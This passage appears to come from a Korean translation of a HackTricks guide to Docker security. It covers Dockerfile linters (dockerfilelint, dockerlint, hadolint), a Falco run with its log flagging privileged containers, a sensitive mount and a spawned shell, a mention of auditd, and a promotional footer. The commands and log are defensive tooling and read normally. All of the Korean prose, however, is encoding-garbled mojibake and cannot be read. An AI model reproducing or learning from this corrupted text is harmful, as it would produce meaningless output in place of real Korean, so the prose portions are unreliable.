* **Dockerfileì„ ê²€ì‚¬**í•˜ê³  ëª¨ë“  ì¢…ë¥˜ì˜ ì˜ëª»ëœ êµ¬ì„±ì„ ì°¾ê¸° ìœ„í•´ ë„êµ¬ [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (212).png>)

* **Dockerfileì„ ê²€ì‚¬**í•˜ê³  ëª¨ë“  ì¢…ë¥˜ì˜ ì˜ëª»ëœ êµ¬ì„±ì„ ì°¾ê¸° ìœ„í•´ ë„êµ¬ [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (71).png>)

* **Dockerfileì„ ê²€ì‚¬**í•˜ê³  ëª¨ë“  ì¢…ë¥˜ì˜ ì˜ëª»ëœ êµ¬ì„±ì„ ì°¾ê¸° ìœ„í•´ ë„êµ¬ [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (501).png>)

#### Logging Suspicious activity

* **ì‹¤í–‰ ì¤‘ì¸ ì»¨í…Œì´ë„ˆì—ì„œ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ í–‰ë™ì„ ê°ì§€**í•˜ê¸° ìœ„í•´ ë„êµ¬ [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ë‹¤ìŒ ë¶€ë¶„ì—ì„œ **Falcoê°€ ì»¤ë„ ëª¨ë“ˆì„ ì»´íŒŒì¼í•˜ê³  ì‚½ì…í•˜ëŠ” ë°©ë²•**ì— ì£¼ëª©í•˜ì„¸ìš”. ê·¸ í›„, ê·œì¹™ì„ ë¡œë“œí•˜ê³  **ì˜ì‹¬ìŠ¤ëŸ¬ìš´ í™œë™ì„ ê¸°ë¡í•˜ê¸° ì‹œì‘í•©ë‹ˆë‹¤**. ì´ ê²½ìš°, 2ê°œì˜ íŠ¹ê¶Œ ì»¨í…Œì´ë„ˆê°€ ì‹œì‘ë˜ì—ˆê³ , ê·¸ ì¤‘ 1ê°œëŠ” ë¯¼ê°í•œ ë§ˆìš´íŠ¸ë¥¼ ê°€ì§€ê³  ìˆìœ¼ë©°, ëª‡ ì´ˆ í›„ì— í•˜ë‚˜ì˜ ì»¨í…Œì´ë„ˆ ë‚´ë¶€ì—ì„œ ì…¸ì´ ì—´ë¦¬ëŠ” ê²ƒì„ ê°ì§€í–ˆìŠµë‹ˆë‹¤.
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### Docker ëª¨ë‹ˆí„°ë§

auditdë¥¼ ì‚¬ìš©í•˜ì—¬ dockerë¥¼ ëª¨ë‹ˆí„°ë§í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì°¸ê³ ìë£Œ

* [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
* [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)


{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
